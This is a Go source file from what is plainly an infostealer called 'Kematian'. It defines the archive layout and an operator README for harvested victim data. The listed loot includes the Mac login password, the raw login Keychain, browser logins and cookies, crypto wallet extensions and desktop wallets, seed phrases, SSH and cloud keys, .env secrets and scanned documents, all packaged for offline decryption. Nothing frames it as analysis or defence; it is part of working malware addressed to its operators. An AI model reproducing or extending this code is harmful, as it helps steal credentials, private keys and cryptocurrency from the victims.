// export_layout.go — zip path constants and README for offline-crack harvest.
//
// Zip layout (primary harvest + scanned-files uploads):
//
//	summary.txt
//	README.txt
//	offline/mac_login_password.txt   Mac password for server-side decrypt
//	keychain/login.keychain-db       raw Keychain (not dump-keychain -d)
//	browsers/{Browser}/{Profile}/    Login Data, Cookies, Local State, …
//	logs/browsers/extensions.json
//	logs/apps/         gaming, vpn metadata
//	logs/seeds/        seed phrase scan (from files)
//	logs/keys/         SSH/cloud keys, password candidates (mac_login only)
//	logs/meta/         harvest.json, wallets.json, files.json, telegram.json
//	wallets/browser-extensions/{Wallet-Browser-Profile}/...
//	wallets/desktop/{WalletName}/...
//	env/{parent}/.env
//	files/documents/   phase-2
//	files/images/
//	files/other/
package main

const (
	zipLogsBrowsers     = "logs/browsers/"
	zipLogsApps         = "logs/apps/"
	zipLogsDiscord      = "logs/discord/"
	zipLogsSeeds        = "logs/seeds/"
	zipLogsKeys         = "logs/keys/"
	zipLogsMeta         = "logs/meta/"
	zipWalletsExtension = "wallets/browser-extensions/"
	zipWalletsDesktop   = "wallets/desktop/"
)

// zipReadmeText is written to README.txt so operators opening a zip know the tree.
func zipReadmeText() string {
	return `Kematian harvest — offline-crack layout
=======================================

summary.txt          Quick counts + mode
README.txt           This file

offline/
  mac_login_password.txt   Mac login password (for offline Keychain + browser decrypt)
  README.txt               Offline decrypt notes

keychain/
  login.keychain-db        Raw login Keychain (encrypted DB — decrypt offline)

browsers/
  {Browser}/Local State
  {Browser}/{Profile}/Login Data, Cookies, Web Data, History, …

logs/browsers/       extensions.json (wallet extension index)
logs/apps/           gaming.json, vpns.json
logs/seeds/          Seed phrase scan from scanned files
logs/keys/           SSH/cloud keys, password_candidates (mac_login)
logs/meta/           harvest.json + wallet/file indexes

wallets/browser-extensions/   Raw extension LevelDB trees
wallets/desktop/              Desktop wallet app data

env/                 .env files found on disk

files/documents/     Phase-2 scanned docs
files/images/
files/other/

NOTE: No on-box decrypted passwords.txt / keychain_dump.txt.
Decrypt offline using mac_login_password.txt + keychain/ + browsers/.
`
}
